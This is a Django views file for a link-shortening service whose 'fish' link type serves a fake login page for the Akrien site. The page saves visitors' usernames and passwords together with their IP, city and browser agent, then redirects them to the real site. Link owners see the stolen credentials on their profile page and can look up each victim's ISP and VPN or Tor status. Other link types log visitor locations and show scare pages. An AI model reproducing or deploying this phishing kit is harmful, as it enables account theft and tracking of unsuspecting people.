from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
import ipware
import requests
from .models import *
from django.core.exceptions import ObjectDoesNotExist
from .forms import *
from django.contrib import messages
from django.contrib.auth import login
import datetime
import string
from random import choice
from django.conf import settings


def generate_random_string(length):
    letters = string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase
    rand_string = ''.join(choice(letters) for i in range(length))
    return rand_string


def index(request, last):
    try:
        found = Links.objects.get(name=last)
    except ObjectDoesNotExist:
        return HttpResponse('Ссылка не существует!')
    if 'fish' in found.type:
        if request.method == 'GET':
            if found.type == 'fishakr':
                return render(request, 'akrien.html')
        else:
            form = StolenAcc(data=request.POST)
            if form.is_valid():
                ip = ipware.get_client_ip(request)
                if ip[1]:
                    ip_info = requests.get(f"https://ipapi.co/{ip[0]}/json/").json()
                    ip_info = f"{ip_info['country_name']}, {ip_info['city']}"
                else:
                    ip_info = 'localhost'
                req_data = Passes()
                req_data.link, req_data.owner_link, req_data.ip, req_data.region, req_data.fish, req_data.agent =\
                    last, found.owner, ip[0], ip_info,\
                    f'{form.cleaned_data["username"]}:{form.cleaned_data["pas"]}', request.headers['User-Agent']
                req_data.save()
                found.counter += 1
                found.save()
                if found.type == 'fishakr':
                    return HttpResponseRedirect('https://akrien.wtf')
            else:
                return HttpResponse("Ошибка")
    ip = ipware.get_client_ip(request)
    if ip[1]:
        ip_info = requests.get(f"https://ipapi.co/{ip[0]}/json/").json()
        ip_info = f"{ip_info['country_name']}, {ip_info['city']}"
    else:
        ip_info = 'localhost'
    req_data = Passes()
    req_data.link, req_data.owner_link, req_data.ip, req_data.region, req_data.agent =\
        last, found.owner, ip[0], ip_info, request.headers['User-Agent']
    req_data.save()
    found.counter += 1
    found.save()

    if found.type == 'screamer1':
        return render(request, 'screamer.html')
    elif found.type == 'screamer2':
        return render(request, 'screamer2.html')
    elif found.type == 'redirect':
        return HttpResponseRedirect(found.redirect)


def none_page(request):
    return HttpResponseRedirect('/reg')


def login_view(request):
    if request.user.is_authenticated:
        return HttpResponseRedirect('/profile')
    if request.method == 'POST':
        form = UserLoginForm(data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return HttpResponseRedirect('/profile')
        else:
            messages.error(request, 'Ошиба авторизации')
    else:
        form = UserLoginForm
    context = {'form': form}
    return render(request, 'login.html', context=context)


def register_view(request):
    if request.user.is_authenticated:
        return HttpResponseRedirect('/profile')
    if request.method == 'POST':
        form = RegistrationForm(request.POST)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect('/login')

    else:
        form = RegistrationForm()
    return render(request, 'register.html', context={'form': form})


def profile_view(request):
    if request.method == 'POST':
        create_data_pro = ShortMyLinkMAX(request.POST)
        if create_data_pro.is_valid():
            try:
                Links.objects.get(name=create_data_pro.cleaned_data['name'])
                messages.error(request, 'Такая ссылка уже существует!')
            except ObjectDoesNotExist:
                if create_data_pro.cleaned_data['name'] == 'None':
                    addr = generate_random_string(8)
                else:
                    addr = create_data_pro.cleaned_data['name']
                new_link = Links()
                new_link.name, new_link.redirect, new_link.type, new_link.owner = \
                    addr, \
                    create_data_pro.cleaned_data['redirect'], \
                    create_data_pro.cleaned_data['type_of'], \
                    request.user.username
                new_link.save()
                messages.success(request, settings.LINK + addr)

    if request.user.is_authenticated:
        can_view_more = False
        if request.user.is_superuser:
            status = 'dev'
            days = 'lt'
            can_view_more = True
            form_add = ShortMyLinkMAX
        elif request.user.is_staff:
            status = 'admin'
            days = 'lt'
            can_view_more = True
            form_add = ShortMyLinkMAX
        else:
            try:
                user_profile = Profiles.objects.get(nickname=request.user.username)
                days = (user_profile.sub_till.replace(tzinfo=None) - datetime.datetime.now()).days + 1
                if days > 1000:
                    days = 'lt'
                if datetime.datetime.now() > user_profile.sub_till.replace(tzinfo=None):
                    status = 'default'
                    days = 0
                    form_add = ShortMyLink
                else:
                    status = user_profile.sub_type
                    if status == 'pro':
                        form_add = ShortMyLinkPro
                    elif status == 'vip':
                        form_add = ShortMyLinkVip
                    elif status == 'max':
                        form_add = ShortMyLinkMAX
                        can_view_more = True
            except ObjectDoesNotExist:
                status = 'default'
                days = 0
                form_add = ShortMyLink
        passes = (Passes.objects.filter(owner_link=request.user.username)).order_by('-time')
        context = {
            'status': status,
            'form_add': form_add,
            'passes': passes,
            'days': days,
            'view_more': can_view_more
        }
        return render(request, 'profile.html', context=context)
    else:
        return HttpResponseRedirect('/login')


def ipinfo(request):
    if request.method == 'GET':
        return HttpResponseRedirect('/profile')
    else:
        data = IpInfo(request.POST)
        if data.is_valid():
            context = dict()
            pas = Passes.objects.get(pk=data.cleaned_data['id'])
            ip_info = requests.get(f'http://ipinfo.io/{pas.ip}?token=145c64e83e1f67').json()
            print(ip_info)
            if 'status' in ip_info.keys():
                error = True
            else:
                error = False
                context.update({
                    'ip': ip_info['ip'],
                    'city': ip_info['city'],
                    'region': ip_info['region'],
                    'timezone': ip_info['timezone'],
                    'postal': ip_info['postal'],
                    'provider': ip_info['company']['name'],
                    'provider_site': ip_info['company']['domain'],
                    'vpn': ip_info['privacy']['vpn'],
                    'proxy': ip_info['privacy']['proxy'],
                    'tor': ip_info['privacy']['tor'],
                    'hosting': ip_info['privacy']['hosting'],
                    'agent': pas.agent,
                })
            context.update({
                'error': error,
            })
            return render(request, 'ipinfo.html', context=context)
